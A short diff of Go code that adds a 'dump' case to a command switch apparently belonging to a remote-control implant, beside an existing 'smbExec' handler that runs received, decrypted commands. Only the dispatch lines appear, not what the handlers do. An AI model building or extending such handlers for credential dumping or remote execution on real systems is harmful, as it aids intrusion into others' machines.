@@ -98,6 +98,9 @@ func Start() {
 			case "smbExec":
 				go smbExecCmd(sendUserId, decData)
 				break
+			case "dump":
+				go dumpCmd(sendUserId, decData)
+				break
 
 			default:
 				break
